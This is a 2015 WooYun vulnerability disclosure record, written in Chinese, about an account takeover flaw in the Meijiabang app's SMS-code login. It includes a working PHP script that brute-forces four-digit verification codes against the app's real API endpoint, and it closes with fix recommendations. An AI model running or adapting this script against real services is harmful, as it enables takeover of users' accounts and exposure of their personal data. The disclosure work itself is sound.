{"id": 18078, "wybug_id": "wooyun-2015-0116855", "wybug_title": "美甲帮APP任意用户登录", "wybug_corp": "美甲帮", "wybug_author": "路人甲", "wybug_date": "2015-05-29 11:00", "wybug_open_date": "2015-07-13 11:02", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 可任意用户登录，查看订单信息，地址等用户个人信息。 详细说明：  发送验证码登录的方式，多次尝试发现并没有对输入次数做限制\n\n而且验证码是四位数。于是抓包，尝试写个脚本暴力跑一下。（由于是测试，并没有从0000开始跑，看到验证码是8894，为了节省时间从8800开始）脚本如下：\n<?php\tset_time_limit(0);\t$startTime = time();\t$i = 8800;\twhile($i<=9999){\t\t$urls = array();\t\t$params = array();\t\t$mh = curl_multi_init();\t\tfor($y = 1; $y<=5; $y++){\t\t\t$param = get_code($i+$y);\t\t\t$url = 'http://meijialove.com/v1/user/phone/verify_verification_code.json?debug_version=42&phone=18888888888&release_platform=iPhone&usage=user_login&verification_code='.$param;\t\t\t$urls[] = $url;\t\t\t$params[] = $param;\t\t\t$conn[$y] = curl_init($url);\t\t\tcurl_setopt($conn[$y], CURLOPT_URL, $url);\t\t\tcurl_setopt($conn[$y], CURLOPT_RETURNTRANSFER, 1);\t\t\tcurl_setopt($conn[$y], CURLOPT_HEADER, 0);\t\t\tcurl_setopt($conn[$y], CURLOPT_CONNECTTIMEOUT, 60);\t\t\tcurl_multi_add_handle($mh, $conn[$y]);\t\t}\t\tdo{\t\t\tcurl_multi_exec($mh, $active);\t\t}while($active);\t\tforeach($urls as $k=>$url){\t\t\t$data = curl_multi_getcontent($conn[$k+1]);\t\t\t$output = json_decode($data,true);\t\t\tif($output['error_code'] === 0){\t\t\t\techo $params[$k];\t\t\t\texit;\t\t\t}\t\t\tcurl_multi_remove_handle($mh, $conn[$k+1]);\t\t\tcurl_close($conn[$k+1]);\t\t}\t\tcurl_multi_close($mh);\t\t$i = $i + 5;\t}\tfunction get_code($i){\t\t$len = strlen($i);\t\t$times = 4-$len;\t\treturn str_repeat('0',$times).$i;\t}?>\n用了curl的多线程去抓取，虽然速度不快，但结果还是出来了。（用工具估计快得多）\n\n\n\n另外验证码并没有设置过期时间，也就是跑多久都可以。而且结果出来了以后可在手机端继续登录，可登录任意手机用户的。   漏洞证明：     修复方案：  - 给验证码设置过期时间以及验证一次后失效- 固定时间内限制验证次数，或者多次验证不正确以后需要验证码操作   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}